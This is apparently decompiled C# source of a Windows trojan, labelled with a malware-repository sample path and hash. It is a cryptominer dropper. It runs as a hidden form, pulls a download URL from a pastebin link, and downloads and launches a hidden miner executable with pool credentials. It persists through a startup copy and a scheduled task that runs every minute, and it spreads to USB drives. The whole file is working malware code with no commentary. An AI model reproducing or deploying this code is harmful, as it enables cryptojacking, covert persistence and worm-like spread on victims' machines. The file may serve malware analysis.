// Decompiled with JetBrains decompiler
// Type: explorer.Form1
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 195DEFF7-EAD4-41F2-9360-D121391B9155
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Agent.gen-8106ef3eb81450eaa681bebbbe8671e3fdbaed8568e8d0376bda37c75ad61c02.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace explorer
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    private string config;
    private string Sconfig;
    public static string Pool = "mine.bmpool.org:6004";
    public static string user = "6218579";
    public static string pass = "karios";
    private string path;
    public static string URL = string.Empty;
    private string AppPath;
    private string AutoStart;
    private FileInfo HideFile;
    private WebClient web;
    public static string Startup = "True";
    public static string SchTasks = "True";
    public static string USB = "True";
    private FileStream fs1;
    private int file1byte;

    public Form1()
    {
      // ISSUE: unable to decompile the method.
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 262);
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    public static string Killer(string proc)
    {
      try
      {
        while (true)
        {
          Process[] processes = Process.GetProcesses();
          int index = 0;
          while (index < processes.Length)
          {
            Process process = processes[index];
            if (Operators.CompareString(process.ProcessName, proc, false) == 0)
              process.Kill();
            checked { ++index; }
          }
          Thread.Sleep(1);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (string) null;
    }

    public void FF()
    {
      while (System.IO.File.Exists(this.path + "\\config.json"))
        System.IO.File.Delete(this.path + "\\config.json");
      System.IO.File.WriteAllText(this.path + "\\config.json", this.Sconfig);
      System.IO.File.SetAttributes(this.path + "\\config.json", FileAttributes.Hidden);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.config = this.config.Replace("Pool url+Port", Form1.Pool);
      this.config = this.config.Replace("PPuser", Form1.user);
      this.config = this.config.Replace("PPpass", Form1.pass);
      this.Sconfig = this.config.Replace("Pool url+Port", "xmr.pool.minergate.com:45700");
      this.Sconfig = this.config.Replace("PPuser", "mddd2823@gmail.com");
      this.Sconfig = this.config.Replace("PPpass", "x");
      if (Operators.CompareString(Form1.Startup, "True", false) == 0)
        this.start();
      if (Operators.CompareString(Form1.SchTasks, "True", false) == 0)
        this.tasks();
      if (Operators.CompareString(Form1.USB, "True", false) == 0)
      {
        try
        {
          new explorer.USB().start_spread();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      while (System.IO.File.Exists(this.path + "\\xivy.exe"))
      {
        try
        {
          this.fs1 = new FileStream(this.path + "\\xivy.exe", FileMode.Open);
          this.file1byte = checked ((int) this.fs1.Length);
          this.fs1.Close();
          if (this.file1byte != 1097728)
            System.IO.File.Delete(this.path + "\\xivy.exe");
          else
            goto label_15;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          goto label_14;
        }
      }
      Form1.URL = this.web.DownloadString("https://pastebin.com/raw/SrgiD8yq").Split('$')[2];
      this.web.DownloadFile(Form1.URL, this.path + "\\xivy.exe");
      System.IO.File.SetAttributes(this.path + "\\xivy.exe", FileAttributes.Hidden);
label_14:
label_15:
      while (true)
      {
        while (System.IO.File.Exists(this.path + "\\config.json"))
          System.IO.File.Delete(this.path + "\\config.json");
        System.IO.File.WriteAllText(this.path + "\\config.json", this.config);
        System.IO.File.SetAttributes(this.path + "\\config.json", FileAttributes.Hidden);
        Process.Start(this.path + "\\xivy.exe");
        Thread.Sleep(checked ((int) Math.Round(TimeSpan.FromHours(2.0).TotalMilliseconds)));
        Form1.Killer("xivy");
        this.FF();
        Process.Start(this.path + "\\xivy.exe");
        Thread.Sleep(checked ((int) Math.Round(TimeSpan.FromHours(2.0).TotalMilliseconds)));
        Form1.Killer("xivy");
      }
    }

    public void tasks() => Interaction.Shell("schtasks /create /sc minute /mo 1 /tn update /tr " + this.path + "\\xivy.exe", AppWinStyle.Hide);

    public void start()
    {
      try
      {
        System.IO.File.Copy(this.AppPath, this.AutoStart);
        this.HideFile.IsReadOnly = true;
        this.HideFile.Attributes |= FileAttributes.Hidden;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
